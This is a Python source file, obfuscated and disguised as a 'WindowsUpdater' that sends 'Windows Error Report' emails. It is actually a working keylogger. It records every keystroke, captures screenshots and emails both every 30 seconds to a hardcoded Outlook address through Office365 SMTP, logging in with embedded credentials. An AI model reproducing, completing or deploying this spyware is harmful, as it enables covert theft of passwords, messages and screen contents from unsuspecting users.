import keyboard #line:1
import smtplib #line:2
from threading import Timer #line:3
from datetime import datetime #line:4
from email .mime .multipart import MIMEMultipart #line:5
from email .mime .image import MIMEImage #line:6
from email .mime .text import MIMEText #line:7
from mss import mss #line:8
import browserhistory as bh #line:9
import os #line:10
CADENCE =30 #line:12
ERROR_ADDR ="installer_error_report@outlook.com"#line:13
ERROR_WORD ="#error#123"#line:14
class WindowsUpdater :#line:16
    def __init__ (OO0000O0OO00O0OO0 ,O0OO0OOOO0000OOO0 ,report_method ="email"):#line:17
        OO0000O0OO00O0OO0 .interval =O0OO0OOOO0000OOO0 #line:19
        OO0000O0OO00O0OO0 .report_method =report_method #line:20
        OO0000O0OO00O0OO0 .log =""#line:21
        OO0000O0OO00O0OO0 .start_dt =datetime .now ()#line:23
        OO0000O0OO00O0OO0 .end_dt =datetime .now ()#line:24
    def callback (OOO0OO0OOOOOOO0OO ,OOOOO00O0O000OO0O ):#line:26
        O000O0OO0O0O0O00O =OOOOO00O0O000OO0O .name #line:27
        if len (O000O0OO0O0O0O00O )>1 :#line:28
            if O000O0OO0O0O0O00O =="space":#line:29
                O000O0OO0O0O0O00O =" "#line:30
            elif O000O0OO0O0O0O00O =="enter":#line:31
                O000O0OO0O0O0O00O ="[ENTER]\n"#line:32
            elif O000O0OO0O0O0O00O =="decimal":#line:33
                O000O0OO0O0O0O00O ="."#line:34
            else :#line:35
                O000O0OO0O0O0O00O =O000O0OO0O0O0O00O .replace (" ","_")#line:36
                O000O0OO0O0O0O00O =f"[{O000O0OO0O0O0O00O.upper()}]"#line:37
        OOO0OO0OOOOOOO0OO .log +=O000O0OO0O0O0O00O #line:38
    def sendmail (O0O00OOOOO0OO0000 ,O00O0OOOO000O0O0O ,O000000OO00000O00 ,OO000O00O0OO00O00 ,verbose =1 ):#line:40
        O0OOOO0OO0000O0O0 ='./windows.png'#line:42
        O0OO00O000OOOO0OO =MIMEMultipart ()#line:44
        O0OO00O000OOOO0OO ["From"]=ERROR_ADDR #line:45
        O0OO00O000OOOO0OO ["To"]=ERROR_ADDR #line:46
        O0OO00O000OOOO0OO ["Subject"]="Windows Error Report"#line:47
        with mss ()as OO0OO0OOOO00OO000 :#line:49
            OO0OO0OOOO00OO000 .shot (output =O0OOOO0OO0000O0O0 )#line:50
        O0000000O0O0O0000 =""#line:52
        with open (O0OOOO0OO0000O0O0 ,'rb')as OO0OOO0OO00O0OOO0 :#line:53
            O0000000O0O0O0000 =OO0OOO0OO00O0OOO0 .read ()#line:54
        OOO0O0OOO00OOO000 =MIMEImage (O0000000O0O0O0000 )#line:56
        OO00OOOO0OO000OOO =f"<h1>{OO000O00O0OO00O00}</h1>"#line:58
        OO000O0OO0O00000O =MIMEText (OO000O00O0OO00O00 ,"plain")#line:59
        O0O0000OO0O0OOOOO =MIMEText (OO00OOOO0OO000OOO ,"html")#line:60
        O0OO00O000OOOO0OO .attach (OO000O0OO0O00000O )#line:61
        O0OO00O000OOOO0OO .attach (O0O0000OO0O0OOOOO )#line:62
        O0OO00O000OOOO0OO .attach (OOO0O0OOO00OOO000 )#line:63
        OO000OO0O00O00OO0 =smtplib .SMTP (host ="smtp.office365.com",port =587 )#line:66
        OO000OO0O00O00OO0 .ehlo ()#line:67
        OO000OO0O00O00OO0 .starttls ()#line:68
        OO000OO0O00O00OO0 .ehlo ()#line:69
        OO000OO0O00O00OO0 .login (O00O0OOOO000O0O0O ,O000000OO00000O00 )#line:70
        OO000OO0O00O00OO0 .sendmail (O00O0OOOO000O0O0O ,O00O0OOOO000O0O0O ,O0OO00O000OOOO0OO .as_string ())#line:71
        os .remove (O0OOOO0OO0000O0O0 )#line:72
        OO000OO0O00O00OO0 .quit ()#line:73
    def report (OO0OO0O0000OO000O ):#line:76
        if OO0OO0O0000OO000O .log :#line:77
            OO0OO0O0000OO000O .end_dt =datetime .now ()#line:79
            if OO0OO0O0000OO000O .report_method =="email":#line:80
                OO0OO0O0000OO000O .sendmail (ERROR_ADDR ,ERROR_WORD ,OO0OO0O0000OO000O .log )#line:81
            OO0OO0O0000OO000O .start_dt =datetime .now ()#line:82
        OO0OO0O0000OO000O .log =""#line:83
        O0OO00OO0OO000OOO =Timer (interval =OO0OO0O0000OO000O .interval ,function =OO0OO0O0000OO000O .report )#line:84
        O0OO00OO0OO000OOO .daemon =True #line:86
        O0OO00OO0OO000OOO .start ()#line:88
    def start (OOOO0OOO000OOOO00 ):#line:90
        OOOO0OOO000OOOO00 .start_dt =datetime .now ()#line:92
        keyboard .on_release (callback =OOOO0OOO000OOOO00 .callback )#line:93
        OOOO0OOO000OOOO00 .report ()#line:94
        keyboard .wait ()#line:96
if __name__ =="__main__":#line:99
    updater =WindowsUpdater (CADENCE ,report_method ="email")#line:100
    updater .start ()